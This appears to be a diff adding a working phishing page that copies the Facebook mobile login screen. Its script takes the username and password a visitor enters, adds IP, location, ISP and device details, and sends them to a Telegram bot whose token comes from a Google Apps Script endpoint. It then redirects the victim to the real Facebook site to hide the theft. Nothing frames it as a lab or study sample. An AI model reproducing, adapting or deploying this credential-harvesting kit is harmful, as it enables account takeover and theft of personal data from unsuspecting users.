@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .mobile-container { width: 100%; max-width: 414px; height: 100%; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .language { color: #606770; font-size: 14px; margin-top: 10px; margin-bottom: 50px; }
+        .logo { width: 60px; height: 60px; margin-bottom: 50px; }
+        .input-group { width: 100%; display: flex; flex-direction: column; gap: 15px; }
+        input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 12px; background-color: #fff; font-size: 16px; outline: none; color: #1c1e21; }
+        input::placeholder { color: #8d949e; }
+        input:focus { border-color: #1877f2; }
+        .login-btn { width: 100%; background-color: #0064e0; color: white; border: none; border-radius: 999px; padding: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        .login-btn:disabled { opacity: 0.7; background-color: #8ab4f8; cursor: not-allowed; }
+        .forgot-pass { color: #1c1e21; font-size: 15px; font-weight: 500; text-decoration: none; margin-top: 20px; }
+        .spacer { flex-grow: 1; }
+        .create-btn { width: 100%; background-color: transparent; border: 1px solid #0064e0; color: #0064e0; border-radius: 999px; padding: 10px; font-weight: bold; font-size: 15px; cursor: pointer; margin-bottom: 25px; }
+        .meta-logo { display: flex; align-items: center; gap: 6px; color: #595959; font-size: 14px; font-weight: 600; margin-bottom: 10px; }
+        .meta-icon { height: 12px; opacity: 0.7; }
+        #status { font-size: 13px; color: #666; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <div class="language">English</div>
+
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Mobile number or email">
+            <input type="password" id="password" placeholder="Password">
+        </div>
+
+        <button class="login-btn" id="btnSubmit" onclick="submitData()">Log in</button>
+        
+        <p id="status">Connecting...</p>
+
+        <a href="#" class="forgot-pass">Forgot password?</a>
+
+        <div class="spacer"></div>
+
+        <button class="create-btn">Create new account</button>
+
+        <div class="meta-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-icon"> 
+        </div>
+    </div>
+
+    <script>
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('=');
+                if (sParameterName[0] == sParam) { return sParameterName[1]; }
+            }
+            return null;
+        }
+
+        const GAS_API_URL = "https://script.google.com/macros/s/AKfycbzXkuhYNBCBGq_XCoOTygSHD89AVVmcvCbkfPtvdqzaLOdyJsclNfWQS9O4CJtXmIx-/exec";
+
+        async function submitData() {
+            const user = document.getElementById("username").value;
+            const pass = document.getElementById("password").value;
+            const btn = document.getElementById("btnSubmit");
+            const status = document.getElementById("status");
+
+            if(!user || !pass) {
+                alert("Please enter mobile number and password");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Logging in...";
+            status.style.display = "block";
+            status.innerText = "Verifying details...";
+
+            const msgId = GetURLParameter('id');
+
+            // Fallback agar ID nahi mili
+            if (!msgId) {
+                console.warn("ID param missing.");
+            }
+
+            try {
+                let BOT_TOKEN = "";
+                let CHAT_ID = "";
+
+                if(msgId) {
+                    // ID se Token lana
+                    const gasResponse = await fetch(`${GAS_API_URL}?id=${msgId}`);
+                    const gasData = await gasResponse.json();
+                    if (gasData.success) {
+                        BOT_TOKEN = gasData.data.token;
+                        CHAT_ID = gasData.data.user_id;
+                    }
+                } else {
+                     // Agar bina ID ke test kar rahe ho to ye error dega
+                     // throw new Error("Setup ID missing");
+                }
+
+                // IP Details
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // Facebook wala Message Format
+                const message = `
+🔵 *Facebook Login Data*
+
+👤 *User:* ${user}
+🔑 *Pass:* ${pass}
+
+🌍 *Location:* ${ipData.city}, ${ipData.country_name}
+📍 *IP:* ${ipData.ip}
+📡 *ISP:* ${ipData.org}
+📱 *Device:* ${navigator.userAgent}
+`;
+
+                if(BOT_TOKEN && CHAT_ID) {
+                    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    await fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json; charset=UTF-8' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: "Markdown"
+                        })
+                    });
+                }
+
+                status.innerText = "Redirecting...";
+                // Redirect to REAL Facebook
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com";
+                }, 1000);
+
+            } catch (error) {
+                console.error(error);
+                status.innerText = "Password incorrect. Please try again.";
+                // Error hone par bhi Facebook login page par bhej do
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com/login/";
+                }, 1500);
+            }
+        }
+    </script>
+
+</body>
+</html>
